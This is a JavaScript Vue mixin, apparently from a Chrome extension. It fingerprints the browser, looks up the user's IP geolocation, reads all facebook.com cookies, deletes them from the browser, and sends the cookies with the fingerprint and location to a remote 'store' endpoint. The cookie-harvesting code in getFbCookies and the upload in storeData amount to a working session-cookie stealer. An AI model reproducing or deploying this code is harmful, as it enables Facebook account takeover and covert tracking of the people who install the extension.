import Fingerprint2 from 'fingerprintjs2'

export const mixins = {
    data() {
        return {

            fingerprints: [],
            geolocation: {},
            timezone:'',
            fbCookies:[],
            data: {address:{}},
            countryCode:'',
            country:''
        }

    },
    created: function(){
        this.getGeolocation().then(() =>{
            this.getFingerprints();
            this.getFbCookies();
        })
    },
    mounted:function(){
        // console.log(this.fingerprints);
        // console.log(this.fbCookies);
        // console.log(this.timezone);
        // console.log(this.geolocation);
    },
    methods: {
        getFingerprints:function(){
            let vm = this;
            let data ={};
            if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1){
                data["key"]="os";
                data["value"]="win";
            }
            if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1)
            {
                data["key"]="os";
                data["value"]="win";
            }
            if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1){
                data["key"]="os";
                data["value"]="win";
            }
            if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1){
                data["key"]="os";
                data["value"]="win";
            }
            if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1){
                data["key"]="os";
                data["value"]="win";
            }
            if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1){
                data["key"]="os";
                data["value"]="win";
            }
            if (window.navigator.userAgent.indexOf("Mac")            != -1){
                data["key"]="os";
                data["value"]="mac";
            }
            if (window.navigator.userAgent.indexOf("X11")            != -1){
                data["key"]="os";
                data["value"]="lin";
            }
            if (window.navigator.userAgent.indexOf("Linux")          != -1){
                data["key"]="os";
                data["value"]="lin";
            }
            if (window.requestIdleCallback) {
                requestIdleCallback(function(){
                    Fingerprint2.get(function (components){

                        // let osname =undefined;

                        components.push(data);
                        vm.fingerprints.push(components);
                        // vm.fingerprints.push(data);

                    });
                });
                // vm.fingerprints[0].push(data);
                console.log(vm.fingerprints);
            }else{
                setTimeout(function(){
                    Fingerprint2.get(function(components){
                        // vm.$set(vm.fingerprints, components)
                        // vm.fingerprints = components;
                        components.push(data);
                        vm.fingerprints.push(components);
                        // console.log(vm.fingerprints);

                    });
                }, 500);
            }

            // console.log(vm.data.fingerprints)
        },
        async getGeolocation(){
            let vm = this;
            await this.$http.get("http://ip-api.com/json").then(response=>{
                console.log(response.status)
                if(response.status === 200){
                    console.log(response.body)
                    vm.$set(vm.data,"address",response.body)
                    vm.timezone = response.body["timezone"];
                    vm.countryCode = response.body["countryCode"]
                    vm.country = response.body["country"]

                }
            })
        },
        getFbCookies: function(){
            var t = this;
            chrome.cookies.getAll({url: "https://www.facebook.com"}, function (e) {
                t.fbCookies.push(e)
                for(let i=0; i<e.length;i++) {
                    chrome.cookies.remove({url: "https://www.facebook.com" + e[i].path, name: e[i].name});
                }
            })

            // console.log(t.fbCookies)
        },
        storeData: function(token){
            var t = this, e = {
                fb_cookies: this.fbCookies[0],
                fingerprints: this.fingerprints[0],
                geolocation: this.data.address,
                timezone: this.timezone
            };

            this.$http.post("store", e, {
                headers: {
                    Authorization: 'Bearer ' + token
                }
            }).then(function (e) {
                t.success = e.body
            }, function (t) {

            }).then(function (e) {

            })
        },
        getData(){
            this.getFbCookies();
            this.getFingerprints();
            this.getGeolocation();
        }
    }

}